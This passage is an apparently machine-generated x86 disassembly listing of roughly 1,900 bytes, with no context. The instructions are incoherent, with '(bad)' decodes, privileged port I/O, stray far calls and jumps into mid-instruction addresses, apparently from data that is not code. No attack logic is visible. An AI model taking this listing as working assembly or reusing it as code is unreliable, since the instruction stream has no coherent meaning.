  4092f1:	pop    ebx
  4092f2:	data16 fisttp QWORD PTR [ebp-0x56188c8f]
  4092f9:	xchg   ebp,eax
  4092fa:	pop    ss
  4092fb:	xor    esi,DWORD PTR [ecx-0x4863b68]
  409301:	not    DWORD PTR fs:[ebx+0x45aebe4d]
  409308:	adc    al,0xe1
  40930a:	or     eax,0x52164fcc
  40930f:	loopne 0x40935b
  409311:	push   edi
  409312:	mov    eax,0x4977b248
  409317:	repnz mov ch,0x8f
  40931a:	ret    0xd3fa
  40931d:	jp     0x4092f6
  40931f:	mov    edi,edi
  409321:	icebp  
  409322:	fidivr WORD PTR [esi-0x67]
  409325:	add    al,0x91
  409327:	mov    WORD PTR [eax-0x2a],cs
  40932a:	data16 xor cl,ch
  40932d:	out    dx,eax
  40932e:	mov    dh,0x4a
  409330:	hlt    
  409331:	rol    BYTE PTR [esi],0x3c
  409334:	repz retf 
  409336:	stos   BYTE PTR es:[edi],al
  409337:	jle    0x4093a6
  409339:	cmc    
  40933a:	das    
  40933b:	push   edi
  40933c:	sub    al,0xb7
  40933e:	cli    
  40933f:	pop    eax
  409340:	aas    
  409341:	adc    ch,bl
  409343:	cmp    BYTE PTR [ebx-0x4a],0xfd
  409347:	scas   eax,DWORD PTR es:[edi]
  409348:	push   0xed458049
  40934d:	sub    dl,0x40
  409350:	mov    ecx,0x84e25655
  409355:	adc    BYTE PTR [eax],dl
  409357:	jge    0x4093b8
  409359:	sti    
  40935a:	aam    0xde
  40935c:	fstp   DWORD PTR [ebp+0x5c]
  40935f:	jg     0x40935c
  409361:	lods   eax,DWORD PTR ds:[esi]
  409362:	sbb    al,0x7c
  409364:	or     al,BYTE PTR [ebx]
  409366:	scas   eax,DWORD PTR es:[edi]
  409367:	mov    bh,0x60
  409369:	addr16 call 0xd0a3:0x5600476e
  409371:	pop    esi
  409372:	xor    al,0xc1
  409374:	sub    al,0xfe
  409376:	enter  0x316e,0x86
  40937a:	retf   
  40937b:	xchg   ecx,eax
  40937c:	les    edi,FWORD PTR [ebx]
  40937e:	cmp    BYTE PTR [edx],ch
  409380:	sbb    al,0xe8
  409382:	es in  al,0xad
  409385:	stc    
  409386:	mov    edi,0x111f8875
  40938b:	push   ecx
  40938c:	xor    DWORD PTR [edx],0x23
  40938f:	call   0x896f75ef
  409394:	sbb    eax,0x3b37d1a2
  409399:	(bad)  
  40939a:	and    DWORD PTR [ecx-0x7daddb1a],esi
  4093a0:	pop    ecx
  4093a1:	icebp  
  4093a2:	repz test DWORD PTR [ebp-0x674499ad],edi
  4093a9:	xchg   edx,eax
  4093aa:	mov    ?,WORD PTR [ebx-0x3f]
  4093ad:	loope  0x4093fb
  4093af:	inc    ebx
  4093b0:	and    esi,ecx
  4093b2:	sbb    eax,0x5dc8c923
  4093b7:	sub    DWORD PTR [edx],0x33
  4093ba:	adc    eax,0x4444a804
  4093bf:	push   edi
  4093c0:	dec    edi
  4093c1:	mov    ds:0xf34559e9,eax
  4093c6:	cmp    BYTE PTR [esi],0xdb
  4093c9:	jb     0x409368
  4093cb:	and    DWORD PTR [esi+ebx*1-0x75a6ca9b],0x290997af
  4093d6:	push   ecx
  4093d7:	fcmovne st,st(5)
  4093d9:	pop    DWORD PTR [esi+0xa4f2a2c]
  4093df:	adc    eax,0x7281f099
  4093e4:	jmp    0x9c971a8c
  4093e9:	sti    
  4093ea:	mov    edi,0xff0aad65
  4093ef:	cmp    eax,0x97ac155c
  4093f4:	pop    esi
  4093f5:	cmc    
  4093f6:	or     BYTE PTR [edx-0xa6d777d],dl
  4093fc:	or     DWORD PTR [edi+0x53],ecx
  4093ff:	add    al,0xb6
  409401:	sbb    ah,BYTE PTR [edi]
  409403:	outs   dx,BYTE PTR ds:[esi]
  409404:	daa    
  409405:	int    0xe
  409407:	adc    ebp,DWORD PTR [edi+0x47]
  40940a:	xor    dl,bl
  40940c:	shr    bl,0x88
  40940f:	sub    BYTE PTR ds:0x7f98a26b,bh
  409415:	pop    ecx
  409416:	in     al,0x6a
  409418:	stos   DWORD PTR es:[edi],eax
  409419:	adc    DWORD PTR [ebx-0x4a5eff0],0x4eea883b
  409423:	sahf   
  409424:	shl    DWORD PTR [esi],1
  409426:	icebp  
  409427:	jno    0x4094a8
  409429:	mov    cs,edi
  40942b:	lea    esi,[edi+0x1bd74483]
  409431:	xor    eax,0x45bf95b8
  409436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409437:	pop    ss
  409438:	cmc    
  409439:	mov    esp,0x9422a5dd
  40943e:	lock jl 0x409420
  409441:	push   es
  409442:	and    eax,0x60e0cccb
  409447:	popf   
  409448:	push   cs
  409449:	dec    edx
  40944a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40944b:	pop    ss
  40944c:	and    edx,edi
  40944e:	addr16 xchg esi,eax
  409450:	add    al,0x3d
  409452:	lods   eax,DWORD PTR ds:[esi]
  409453:	js     0x409457
  409455:	fild   QWORD PTR [edx]
  409457:	push   esi
  409458:	and    edx,DWORD PTR [eax]
  40945a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40945b:	mov    ds:0x88aa6b72,eax
  409460:	jle    0x409446
  409462:	mov    eax,ds:0xc8b87299
  409467:	push   eax
  409468:	adc    esp,DWORD PTR [ebx-0x4d]
  40946b:	push   ebp
  40946c:	inc    edx
  40946d:	das    
  40946e:	imul   ecx,ebp,0xd72f47f9
  409474:	(bad)  
  409475:	fisubr DWORD PTR [edx+ebp*4]
  409478:	and    DWORD PTR gs:[esi],ebx
  40947b:	mov    esi,0xfa2befb0
  409480:	daa    
  409481:	or     BYTE PTR [ebp+0x1829b651],0xb
  409488:	out    dx,eax
  409489:	aas    
  40948a:	mov    esp,0x91eeeb88
  40948f:	dec    ebx
  409490:	out    0xc9,al
  409492:	jg     0x40944e
  409494:	dec    eax
  409495:	jecxz  0x40943c
  409497:	pusha  
  409498:	sbb    DWORD PTR [ebx+0x64],0xade8f4ef
  40949f:	rcl    dl,cl
  4094a1:	jo     0x409436
  4094a3:	adc    eax,0xd8a245a1
  4094a8:	call   0x4ffd:0x77436883
  4094af:	test   BYTE PTR [ebp+edx*2-0x2],ch
  4094b3:	test   al,0x76
  4094b5:	jae    0x4094b9
  4094b7:	cmp    cl,BYTE PTR [edi+0x3a9dd5ae]
  4094bd:	xchg   esi,eax
  4094be:	push   ebp
  4094bf:	adc    ecx,DWORD PTR [ecx]
  4094c1:	enter  0x8507,0x4d
  4094c5:	cmc    
  4094c6:	das    
  4094c7:	xchg   DWORD PTR [edi+0x4c],ecx
  4094ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094cb:	dec    eax
  4094cc:	mov    esi,0xc588db52
  4094d1:	pshufw mm4,QWORD PTR [ecx+0x42cae0c9],0x9a
  4094d9:	sbb    bl,BYTE PTR [eax]
  4094db:	mov    esi,0x159f02f2
  4094e0:	dec    esi
  4094e1:	mov    ch,0x11
  4094e3:	mov    dh,0x9f
  4094e5:	or     cl,BYTE PTR [edx]
  4094e7:	stos   BYTE PTR es:[edi],al
  4094e8:	jae    0x4094f4
  4094ea:	sar    DWORD PTR [eax-0x3a],1
  4094ed:	scas   eax,DWORD PTR es:[edi]
  4094ee:	out    dx,eax
  4094ef:	std    
  4094f0:	push   ebp
  4094f1:	add    BYTE PTR [eax+eiz*1+0x1944d5d],al
  4094f8:	out    dx,eax
  4094f9:	push   edi
  4094fa:	xchg   esi,eax
  4094fb:	pop    ss
  4094fc:	sbb    ebx,0xf5b70265
  409502:	rcr    al,0xc5
  409505:	popa   
  409506:	sub    al,0xc8
  409508:	add    BYTE PTR [ebp-0x1e],cl
  40950b:	inc    ebp
  40950c:	or     BYTE PTR [ebp+0x2e],bh
  40950f:	or     dl,BYTE PTR [ebx]
  409511:	xor    al,0xe5
  409513:	adc    DWORD PTR [edi-0x2e],ecx
  409516:	loop   0x409578
  409518:	(bad)  
  409519:	sti    
  40951a:	xor    DWORD PTR [ebx],edi
  40951c:	mov    al,ds:0x378679e5
  409521:	das    
  409522:	iret   
  409523:	push   0xb0e62237
  409528:	(bad)  [eax+0x8]
  40952b:	mov    edx,0xff05cb4f
  409530:	out    0x2a,al
  409532:	lahf   
  409533:	jno    0x40952c
  409535:	jbe    0x409581
  409537:	hlt    
  409538:	xor    BYTE PTR [ecx],bh
  40953a:	arpl   WORD PTR [edi+edi*1+0x19],si
  40953e:	or     esi,DWORD PTR [ebx+ebp*2]
  409541:	in     eax,dx
  409542:	cli    
  409543:	lock out dx,al
  409545:	sti    
  409546:	xchg   esi,eax
  409547:	xchg   ebx,eax
  409548:	jl     0x4094fb
  40954a:	xor    al,0xf
  40954c:	retf   0x87be
  40954f:	jmp    0x409556
  409551:	call   0xd5bf:0x3548686b
  409558:	fxch   st(0)
  40955a:	lea    ebx,[edi+0x65]
  40955d:	and    BYTE PTR [ecx-0x6a74e685],al
  409563:	xchg   ebp,eax
  409564:	cmp    ecx,esi
  409566:	push   esp
  409567:	pop    esp
  409568:	pop    ds
  409569:	jae    0x409509
  40956b:	xor    BYTE PTR [ecx+edi*2],0xf4
  40956f:	rcr    BYTE PTR [ebx-0x54],0x81
  409573:	jge    0x409560
  409575:	fidivr WORD PTR [ecx-0x10]
  409578:	(bad)  
  409579:	mov    esi,0xc377a2e2
  40957e:	xchg   esi,eax
  40957f:	rol    BYTE PTR [ebx],cl
  409581:	push   ebx
  409582:	out    0xb9,eax
  409584:	ret    0x391e
  409587:	jmp    0x81cd:0xff29cfdf
  40958e:	arpl   WORD PTR [ebx],sp
  409590:	mov    bh,0x46
  409592:	ins    BYTE PTR es:[edi],dx
  409593:	retf   0x2455
  409596:	jae    0x4095ed
  409598:	sub    al,0x3a
  40959a:	mov    ds:0x12fbb783,al
  40959f:	mov    ch,0xb9
  4095a1:	mov    esp,0x5f6d8f26
  4095a6:	pop    ebx
  4095a7:	retf   0x895c
  4095aa:	addr16 cdq 
  4095ac:	mov    al,ds:0x30ae6c
  4095b1:	sbb    dh,BYTE PTR [ebp+esi*2-0x23d930e0]
  4095b8:	jne    0x40953e
  4095ba:	loopne 0x409639
  4095bc:	jmp    0x409559
  4095be:	xchg   esi,eax
  4095bf:	fcmovbe st,st(7)
  4095c1:	jmp    0xe08c:0x17b9d808
  4095c8:	test   DWORD PTR [ebx-0x80],edi
  4095cb:	lods   al,BYTE PTR ds:[esi]
  4095cc:	div    edi
  4095ce:	xchg   edx,eax
  4095cf:	leave  
  4095d0:	retf   0xe4cc
  4095d3:	adc    eax,0xd3261be3
  4095d8:	outs   dx,BYTE PTR ds:[esi]
  4095d9:	jmp    0x409578
  4095db:	scas   al,BYTE PTR es:[edi]
  4095dc:	sti    
  4095dd:	aad    0x44
  4095df:	pop    edi
  4095e0:	sbb    eax,0x2692a615
  4095e5:	dec    edi
  4095e6:	xlat   BYTE PTR ds:[ebx]
  4095e7:	mov    ecx,0x22cd17be
  4095ec:	push   ss
  4095ed:	pop    eax
  4095ee:	out    dx,al
  4095ef:	add    ebx,edx
  4095f1:	ins    DWORD PTR es:[edi],dx
  4095f2:	push   cs
  4095f3:	lds    ebp,FWORD PTR [edi]
  4095f5:	js     0x40965b
  4095f7:	fs loop 0x4095f2
  4095fa:	pop    es
  4095fb:	cmp    cl,BYTE PTR [esi+0x64c7636d]
  409601:	outs   dx,BYTE PTR ds:[esi]
  409602:	add    edi,DWORD PTR [ebx]
  409604:	jmp    FWORD PTR [edi+0x7a]
  409607:	jnp    0x409646
  409609:	pop    esi
  40960a:	pop    eax
  40960b:	cwde   
  40960c:	jne    0x409667
  40960e:	push   ecx
  40960f:	push   0x15caaa4a
  409614:	add    al,0xb6
  409616:	add    al,0x33
  409618:	jno    0x409676
  40961a:	nop
  40961b:	cld    
  40961c:	mov    esi,0x1632b1f4
  409621:	and    BYTE PTR [edi-0x6a],0xb5
  409625:	call   0x597c:0x8a4dbafd
  40962c:	rcl    dh,0xa4
  40962f:	push   es
  409630:	ins    DWORD PTR es:[edi],dx
  409631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409632:	mov    cl,0x7e
  409634:	dec    eax
  409635:	mov    dh,BYTE PTR [edi+0x63234d2a]
  40963b:	jl     0x40968b
  40963d:	dec    ebp
  40963e:	scas   eax,DWORD PTR es:[edi]
  40963f:	les    ecx,FWORD PTR [esp+ebp*1-0x68c6f61f]
  409646:	sbb    al,0x7a
  409648:	or     edi,DWORD PTR [ebx-0x224e8a41]
  40964e:	pop    es
  40964f:	cmc    
  409650:	mov    eax,fs:0xb3dfee9a
  409656:	arpl   WORD PTR ds:0x6e7429dd,cx
  40965c:	pop    es
  40965d:	xor    dh,BYTE PTR [edi+0x26]
  409660:	loop   0x4095fc
  409662:	fmul   st(1),st
  409664:	hlt    
  409665:	pop    ebx
  409666:	outs   dx,BYTE PTR ds:[esi]
  409667:	dec    esi
  409668:	mov    BYTE PTR [esi-0x174dce87],ch
  40966e:	push   ebx
  40966f:	adc    al,cl
  409671:	or     bh,cl
  409673:	imul   ebx,DWORD PTR [edi-0x7c],0x3f80919d
  40967a:	mov    ah,0x59
  40967c:	jmp    0x40964a
  40967e:	cwde   
  40967f:	call   0xe85a:0xa80504b9
  409686:	dec    eax
  409687:	gs fwait
  409689:	push   edx
  40968a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40968b:	or     BYTE PTR [ecx-0x274fcba6],dl
  409691:	jmp    0x4096a2
  409693:	cmp    eax,edi
  409695:	jecxz  0x40967d
  409697:	bound  ecx,QWORD PTR [eax]
  409699:	aad    0xf1
  40969b:	(bad)  
  40969c:	out    0x7b,al
  40969e:	test   DWORD PTR ds:0xcf7a3b19,eax
  4096a4:	cmp    al,0x8
  4096a6:	pop    edx
  4096a7:	dec    esp
  4096a8:	mov    bl,BYTE PTR [eax]
  4096aa:	pop    DWORD PTR [esi-0x14]
  4096ad:	xchg   edi,eax
  4096ae:	imul   esi,DWORD PTR [ebp+0xa],0x7a
  4096b2:	cdq    
  4096b3:	call   0x3c772ff9
  4096b8:	dec    ecx
  4096b9:	jbe    0x4096cf
  4096bb:	xchg   esi,eax
  4096bc:	xchg   ebp,eax
  4096bd:	(bad)  
  4096be:	xchg   ebp,eax
  4096bf:	pop    edi
  4096c0:	stc    
  4096c1:	mov    bl,0xff
  4096c3:	aas    
  4096c4:	mov    BYTE PTR [eax-0x76930a09],cl
  4096ca:	jb     0x4096bc
  4096cc:	lods   al,BYTE PTR ds:[esi]
  4096cd:	ficomp WORD PTR [ecx+esi*4]
  4096d0:	loopne 0x409681
  4096d2:	enter  0xf148,0xde
  4096d6:	push   ebp
  4096d7:	dec    esi
  4096d8:	pop    ds
  4096d9:	xchg   ebp,eax
  4096da:	pop    esi
  4096db:	loopne 0x409664
  4096dd:	fst    QWORD PTR [edi+0x2a]
  4096e0:	xchg   edx,eax
  4096e1:	sub    BYTE PTR [esp+0x39],0xb0
  4096e6:	and    DWORD PTR [esi-0x58],esp
  4096e9:	and    dl,BYTE PTR [edx+0x15]
  4096ec:	in     al,dx
  4096ed:	jnp    0x409681
  4096ef:	xor    DWORD PTR [esi+0x65],ebx
  4096f2:	add    DWORD PTR [edx-0x49487f61],ebx
  4096f8:	jp     0x409742
  4096fa:	icebp  
  4096fb:	dec    ebx
  4096fc:	fmul   DWORD PTR [ebx+edi*8+0x2c]
  409700:	add    eax,ebp
  409702:	fs add ah,dh
  409705:	out    dx,al
  409706:	lods   eax,DWORD PTR ds:[esi]
  409707:	mov    bh,0xcc
  409709:	xchg   ecx,eax
  40970a:	dec    eax
  40970b:	mov    ds:0xcc953a57,eax
  409710:	and    ecx,esp
  409712:	outs   dx,BYTE PTR ds:[esi]
  409713:	cmp    cl,BYTE PTR [eax+0x62]
  409716:	je     0x409754
  409718:	jl     0x40969a
  40971a:	pop    ss
  40971b:	pop    ebp
  40971c:	lahf   
  40971d:	cs adc al,0xcc
  409720:	jno    0x409727
  409722:	ret    
  409723:	sbb    edi,ecx
  409725:	dec    esp
  409726:	imul   edx,DWORD PTR [ebp-0x4f6bafe5],0xffffffcd
  40972d:	sbb    BYTE PTR [eax+0x254cf116],dh
  409733:	adc    BYTE PTR [esi+0x2e317c45],bl
  409739:	pop    edx
  40973a:	inc    edx
  40973b:	sbb    dh,BYTE PTR [esi]
  40973d:	xor    ecx,DWORD PTR ss:[ecx]
  409740:	in     al,0x9d
  409742:	sub    BYTE PTR ds:0x88d29bad,0x7d
  409749:	lds    edi,FWORD PTR [edi-0xdf8fd74]
  40974f:	pop    ebp
  409750:	pop    gs
  409752:	pop    edx
  409753:	outs   dx,DWORD PTR ds:[esi]
  409754:	push   esi
  409755:	mov    ecx,0xc802b4ba
  40975a:	xor    al,0x5c
  40975c:	adc    DWORD PTR ss:[ebx+ebx*4],eax
  409760:	ins    DWORD PTR es:[edi],dx
  409761:	sbb    BYTE PTR [ebx+0x7d],0xf1
  409765:	(bad)  
  409766:	stos   BYTE PTR es:[edi],al
  409767:	cmp    al,0x81
  409769:	pop    edx
  40976a:	sub    BYTE PTR [edx],dh
  40976c:	and    DWORD PTR [ecx-0x4cd0a986],0xc4cdc8ef
  409776:	inc    esp
  409777:	imul   esp,DWORD PTR [eax-0x27303bd4],0x3c
  40977e:	mul    DWORD PTR [edi-0x65]
  409781:	out    0x68,eax
  409783:	pop    es
  409784:	and    edx,eax
  409786:	sti    
  409787:	icebp  
  409788:	mov    edi,0x12cb03a2
  40978d:	je     0x409785
  40978f:	into   
  409790:	sbb    DWORD PTR ds:0x6401ea6,ecx
  409796:	idiv   dl
  409798:	lock xor ah,dh
  40979b:	test   al,0xf4
  40979d:	dec    esi
  40979e:	pushf  
  40979f:	xchg   ecx,edx
  4097a1:	cmc    
  4097a2:	inc    esi
  4097a3:	or     DWORD PTR [edx+0x78],eax
  4097a6:	mov    edi,0x1a840474
  4097ab:	lods   eax,DWORD PTR ds:[esi]
  4097ac:	pop    edx
  4097ad:	aam    0x82
  4097af:	pop    ss
  4097b0:	mov    ebp,0x5b813e79
  4097b5:	pop    esi
  4097b6:	outs   dx,DWORD PTR ds:[esi]
  4097b7:	mov    bh,0xe6
  4097b9:	call   0xd3ae:0x11d77e7e
  4097c0:	add    DWORD PTR [eax+0x79efd327],ebp
  4097c6:	push   edi
  4097c7:	fstp   QWORD PTR [esi+0x3934ae8f]
  4097cd:	test   dl,bl
  4097cf:	jbe    0x409757
  4097d1:	adc    DWORD PTR [ebx],0x45
  4097d4:	or     esi,DWORD PTR [edi]
  4097d6:	xchg   BYTE PTR [eax+0x10],dl
  4097d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097da:	lahf   
  4097db:	das    
  4097dc:	(bad)  
  4097dd:	into   
  4097de:	lock jg 0x409814
  4097e1:	jmp    0x1b9efacd
  4097e6:	sbb    al,0xe1
  4097e8:	or     eax,0x83f8615a
  4097ed:	xchg   edi,eax
  4097ee:	jge    0x4097e3
  4097f0:	or     dl,al
  4097f2:	aad    0xd0
  4097f4:	sti    
  4097f5:	lea    ebx,[edx]
  4097f7:	lds    esp,FWORD PTR [ebx+ecx*1-0x70]
  4097fb:	sahf   
  4097fc:	call   0x4a8331c2
  409801:	cmc    
  409802:	push   ecx
  409803:	fdivr  DWORD PTR [bx+di]
  409806:	fsubr  DWORD PTR [ebx+0x69]
  409809:	das    
  40980a:	mov    bl,0xbc
  40980c:	loopne 0x4097f0
  40980e:	pusha  
  40980f:	in     eax,dx
  409810:	repnz lea ebp,ss:[edx+eax*4-0x31]
  409816:	out    0x64,al
  409818:	loope  0x4097a6
  40981a:	mov    ah,0xc9
  40981c:	das    
  40981d:	dec    BYTE PTR [edx]
  40981f:	nop
  409820:	adc    ah,BYTE PTR [ebx]
  409822:	(bad)  [eax+0x72]
  409825:	push   ebp
  409826:	out    0xbd,eax
  409828:	scas   al,BYTE PTR es:[edi]
  409829:	push   ds
  40982a:	sbb    eax,0x3eaa8f2a
  40982f:	mov    WORD PTR [ebx+0x22],ss
  409832:	fmulp  st(7),st
  409834:	scas   al,BYTE PTR es:[edi]
  409835:	jl     0x4098b5
  409837:	push   es
  409838:	je     0x409882
  40983a:	mov    ss,ebx
  40983c:	or     eax,0xe77e4059
  409841:	sub    esp,DWORD PTR [ecx+0x2851c051]
  409847:	jge    0x4097f3
  409849:	xchg   ebp,eax
  40984a:	(bad)  
  40984b:	pop    edi
  40984c:	out    0xd8,al
  40984e:	loopne 0x40989d
  409850:	(bad)  
  409852:	pop    ds
  409853:	fidiv  DWORD PTR [ecx]
  409856:	jp     0x40987a
  409858:	in     al,0x2f
  40985a:	call   0xb008:0x5549e7a1
  409861:	sub    BYTE PTR [ebx],0xc1
  409864:	adc    al,0xac
  409866:	xor    BYTE PTR [esi-0x29733c9c],cl
  40986c:	pop    esp
  40986d:	imul   esp,DWORD PTR [ebp+0x63],0x9
  409871:	shl    edx,1
  409873:	aas    
  409874:	loopne 0x409857
  409876:	int    0xb9
  409878:	in     eax,0xeb
  40987a:	adc    eax,0x7c8a3086
  40987f:	sbb    al,0x91
  409881:	mov    ecx,0x3f28db9f
  409886:	jno    0x40981f
  409888:	mov    esi,0xe6a20a76
  40988d:	mov    cl,0xe5
  40988f:	adc    dh,BYTE PTR [ecx]
  409891:	fld    QWORD PTR [ecx]
  409893:	mov    BYTE PTR [ecx],al
  409895:	(bad)  
  409896:	mov    edi,?
  409898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409899:	push   es
  40989a:	imul   edi,DWORD PTR [ecx-0x4bf7d545],0x26363da8
  4098a4:	jae    0x4098f9
  4098a6:	popa   
  4098a7:	cmp    bl,BYTE PTR [edx+eax*4-0x34]
  4098ab:	adc    eax,0x6202d59e
  4098b0:	jns    0x4098b7
  4098b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098b3:	or     edi,ebp
  4098b5:	sbb    al,0xb8
  4098b7:	retf   
  4098b8:	xchg   ebx,eax
  4098b9:	stos   BYTE PTR es:[edi],al
  4098ba:	in     al,dx
  4098bb:	jecxz  0x4098fe
  4098bd:	xor    edi,DWORD PTR [ecx+edx*4+0x26]
  4098c1:	ret    
  4098c2:	or     al,0x6f
  4098c4:	mov    eax,ds:0x44730d8
  4098c9:	in     al,dx
  4098ca:	pop    edx
  4098cb:	aaa    
  4098cc:	leave  
  4098cd:	adc    ecx,DWORD PTR [ebp-0x44]
  4098d0:	jle    0x4098f0
  4098d2:	(bad)  
  4098d4:	inc    edx
  4098d5:	cs cmp ecx,eax
  4098d8:	push   ebx
  4098d9:	dec    eax
  4098da:	stos   BYTE PTR es:[edi],al
  4098db:	shl    dh,cl
  4098dd:	not    BYTE PTR [esi]
  4098df:	bound  ebp,QWORD PTR [ebx-0x79]
  4098e2:	push   eax
  4098e3:	ds (bad) 
  4098e5:	in     al,dx
  4098e6:	fmul   DWORD PTR [ebx+0x5badc7ed]
  4098ec:	xlat   BYTE PTR ds:[ebx]
  4098ed:	pop    ebp
  4098ee:	adc    al,0x74
  4098f0:	repz aam 0x6e
  4098f3:	popf   
  4098f4:	clc    
  4098f5:	adc    eax,0x88aedc89
  4098fa:	mov    ds:0xf67d950b,eax
  4098ff:	shr    BYTE PTR [esi+0x79d60df6],0x9a
  409906:	pop    ebx
  409907:	scas   al,BYTE PTR es:[edi]
  409908:	popa   
  409909:	or     BYTE PTR ss:[eax-0x1],al
  40990d:	fistp  QWORD PTR [bx]
  409910:	jl     0x40995e
  409912:	loope  0x4098a9
  409914:	sub    DWORD PTR [esi],ebx
  409916:	adc    BYTE PTR [eax],ch
  409918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409919:	icebp  
  40991a:	dec    esi
  40991b:	call   0x171:0x45a82fb6
  409922:	nop
  409923:	cdq    
  409924:	call   0xe582:0xd413a6dc
  40992b:	std    
  40992c:	add    cl,BYTE PTR [esi]
  40992e:	es int 0xb1
  409931:	jns    0x409937
  409933:	cmp    dl,ch
  409935:	and    ch,al
  409937:	xchg   esp,eax
  409938:	inc    ebx
  409939:	inc    esp
  40993a:	push   ebx
  40993b:	rol    BYTE PTR [esi-0x6a3566e3],1
  409941:	or     al,0x6
  409943:	aad    0x5d
  409945:	loopne 0x4099a1
  409947:	jnp    0x409928
  409949:	fst    DWORD PTR [ecx-0x4]
  40994c:	in     eax,0x96
  40994e:	aam    0x9b
  409950:	nop
  409951:	mov    esp,0xe42d9f45
  409956:	repnz stos DWORD PTR es:[edi],eax
  409958:	cmp    BYTE PTR [edx],0x3c
  40995b:	ds push 0xffffffcb
  40995e:	push   ebp
  40995f:	mov    cl,BYTE PTR [edx+0x10]
  409962:	sbb    DWORD PTR [ecx+0x2],esp
  409965:	ds cld 
  409967:	pop    eax
  409968:	retf   
  409969:	outs   dx,DWORD PTR ds:[esi]
  40996a:	into   
  40996b:	xor    eax,0xf990e20f
  409970:	out    dx,eax
  409971:	rcl    bh,0xc3
  409974:	lea    esp,[ebx+0x2c]
  409977:	fsubr  st(3),st
  409979:	popa   
  40997a:	xor    al,0x68
  40997c:	(bad)  
  40997d:	in     al,0x5f
  40997f:	enter  0x22fe,0xbb
  409983:	push   edx
  409984:	scas   eax,DWORD PTR es:[edi]
  409985:	bound  edx,QWORD PTR [ebx]
  409987:	mov    ebp,0xe0fe12b8
  40998c:	or     DWORD PTR [edx],ebp
  40998e:	jmp    0x4099ee
  409990:	mov    WORD PTR [esi],?
  409992:	mov    ?,WORD PTR [esi-0xf]
  409995:	pop    ebp
  409996:	fwait
  409997:	jmp    0x409a16
  409999:	sbb    dl,bh
  40999b:	adc    al,0x77
  40999d:	sub    eax,0x864f4baf
  4099a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099a3:	scas   al,BYTE PTR es:[edi]
  4099a4:	lods   eax,DWORD PTR ds:[esi]
  4099a5:	scas   eax,DWORD PTR es:[edi]
  4099a6:	and    al,0x26
  4099a8:	sub    cl,BYTE PTR [ebp-0x40]
  4099ab:	les    edi,FWORD PTR [ebx+0xb41e63]
  4099b1:	(bad)  
  4099b2:	retf   
  4099b3:	sub    ch,dh
  4099b5:	adc    DWORD PTR [ebx+0x30],edi
  4099b8:	inc    ebp
  4099b9:	mov    ecx,0xbfd55b0d
  4099bf:	in     eax,dx
  4099c0:	adc    eax,ebx
  4099c2:	sbb    eax,0x960e34a5
  4099c7:	dec    edx
  4099c8:	loopne 0x409977
  4099ca:	mov    edi,0x9923b822
  4099cf:	(bad)
  4099d2:	lods   eax,DWORD PTR ds:[esi]
  4099d3:	cmp    ch,BYTE PTR [edx-0x696e71dc]
  4099d9:	pop    edx
  4099da:	dec    ecx
  4099db:	rol    edx,0x87
  4099de:	adc    BYTE PTR ds:0xa0062c38,ah
  4099e4:	sbb    edx,DWORD PTR [ecx+ecx*1+0x1e8cc150]
  4099eb:	mov    esi,0xe869c18a
  4099f0:	ss push ecx
  4099f2:	lods   eax,DWORD PTR ds:[esi]
  4099f3:	xchg   esp,eax
  4099f4:	ins    DWORD PTR es:[edi],dx
  4099f5:	in     eax,dx
  4099f6:	test   BYTE PTR [ebx-0x3],dh
  4099f9:	adc    al,0x1b
  4099fb:	addr16 xchg edx,eax
  4099fd:	mov    dh,0xf3
  4099ff:	mov    al,0xb7
  409a01:	(bad)  
  409a02:	dec    esi
  409a03:	shl    DWORD PTR [esp+esi*8+0x77],cl
  409a07:	mov    eax,0x5203e08f
  409a0c:	xor    edx,edi
  409a0e:	or     ecx,ebx
  409a10:	bound  eax,QWORD PTR [ebx+0x5d]
  409a13:	pop    edx
  409a14:	stc    
  409a15:	inc    edi
  409a16:	pop    ebp
  409a17:	mov    ss,WORD PTR [ecx]
  409a19:	frstor cs:[ebx+0x62]
  409a1d:	adc    ecx,DWORD PTR [ecx+0x61]
  409a20:	imul   edi,DWORD PTR [ebx-0x11],0xfbe62b67
  409a27:	add    eax,0x19da137e
  409a2c:	fld    TBYTE PTR [esi-0x78544521]
  409a32:	bound  edx,QWORD PTR [eax-0x17a5917d]
  409a38:	pop    eax
  409a39:	add    edi,DWORD PTR [esi+esi*2+0x5d51f209]
  409a40:	xchg   ecx,eax
  409a41:	dec    esp
  409a42:	xor    bh,BYTE PTR [ebx+0x28]
  409a45:	push   0x6b
  409a47:	jge    0x409a2b
  409a49:	mov    ah,0x4e
  409a4b:	push   ecx
  409a4c:	pop    ecx
  409a4d:	adc    eax,DWORD PTR [ecx+0x487e56d9]
  409a53:	dec    ecx
  409a54:	mov    DWORD PTR [ecx-0x11d92cc8],edi
  409a5a:	mov    al,ds:0x19536680
  409a5f:	aad    0x55
  409a61:	adc    al,0x6b
  409a63:	stos   BYTE PTR es:[edi],al
  409a64:	aaa    
  409a65:	mov    ss,WORD PTR [eax+0x20]
  409a68:	jns    0x409ab7
  409a6a:	pushf  
  409a6b:	test   edi,eax
  409a6d:	retf   
  409a6e:	rcr    DWORD PTR [eax-0x5],cl
  409a71:	pop    ebx
  409a72:	retf   0x974
  409a75:	pop    ss
  409a76:	add    ch,BYTE PTR [ecx-0x54]
  409a79:	sub    ah,ch
  409a7b:	pusha  
  409a7c:	sbb    al,0xb0
  409a7e:	lock outs dx,BYTE PTR ds:[esi]
  409a80:	mov    dh,0xf
  409a82:	rcl    BYTE PTR ds:0x12c15823,1
  409a88:	jecxz  0x409ae0
  409a8a:	dec    ebx
  409a8b:	fstp   st(0)
  409a8d:	push   ecx
  409a8e:	stos   DWORD PTR es:[edi],eax
  409a8f:	aam    0x82
  409a91:	test   DWORD PTR [eax],edx
  409a93:	pop    ds
  409a94:	mov    bl,0x11
  409a96:	lods   al,BYTE PTR ds:[esi]
  409a97:	push   ecx
  409a98:	jmp    0x705c:0xbd3099d6
  409a9f:	add    al,0xa9
  409aa1:	push   fs
